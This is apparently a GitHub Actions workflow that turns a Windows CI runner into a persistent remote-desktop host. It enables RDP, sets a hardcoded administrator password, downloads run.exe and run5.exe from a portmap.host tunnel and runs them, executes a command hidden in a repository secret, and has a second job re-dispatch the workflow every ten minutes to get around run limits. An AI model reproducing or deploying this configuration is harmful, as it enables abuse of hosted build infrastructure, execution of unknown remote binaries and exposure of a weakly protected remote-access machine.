name: last

on: 
  push
  workflow_dispatch
  schedule:
    - cron: "*/10 * * * *" # Check every 10 minutes if the workflow stops

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Enable TS
        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

      - name: Enable Firewall Rule
        run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

      - name: Set User Authentication
        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1

      - name: Set Runner Admin Password
        run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)

      - name: Download second Batch File
        run: Invoke-WebRequest -Uri "http://xama1-63478.portmap.host:63478/run.exe" -OutFile run.exe

      - name: Execute second Batch File
        run: |
          Start-Process -FilePath "run.exe"
          while (Get-Process | Where-Object { $_.ProcessName -eq "run" }) {
            Start-Sleep -Seconds 5
          }

      - name: Download third Batch File
        run: Invoke-WebRequest -Uri "http://xama1-63478.portmap.host:63478/run5.exe" -OutFile run5.exe

      - name: Execute third Batch File
        run: |
          Start-Process -FilePath "run5.exe"
          while (Get-Process | Where-Object { $_.ProcessName -eq "run" }) {
            Start-Sleep -Seconds 5
          }

      - name: Open CMD and Run Secret Command
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
        run: |
          Start-Process -FilePath "cmd.exe" -ArgumentList "/k $env:MY_SECRET"

      - name: Keep connection alive for unlimited hours
        run: Start-Sleep -Seconds 2147483

  monitor_self:
    runs-on: windows-latest

    steps:
      - name: Check Workflow Status
        id: check_status
        run: |
          $repo = "snikms/torbo"
          $workflow_name = "last.yml"
          $token = "${{ secrets.GITHUB_TOKEN }}"
          
          # Fetch the latest run of this workflow
          $url = "https://api.github.com/repos/$repo/actions/workflows/$workflow_name/runs?per_page=1"
          $response = Invoke-RestMethod -Uri $url -Headers @{Authorization = "Bearer $token"}
          $status = $response.workflow_runs[0].status
          
          if ($status -ne "completed" -and $status -ne "in_progress") {
            Write-Host "Workflow stopped. Triggering re-run..."
            $dispatch_url = "https://api.github.com/repos/$repo/actions/workflows/$workflow_name/dispatches"
            Invoke-RestMethod -Method POST -Uri $dispatch_url -Headers @{Authorization = "Bearer $token"} -Body (@{ref="main"} | ConvertTo-Json -Depth 1)
          } else {
            Write-Host "Workflow is running or completed successfully."
          }

      - name: Keep the Workflow Alive
        run: Start-Sleep -Seconds 600
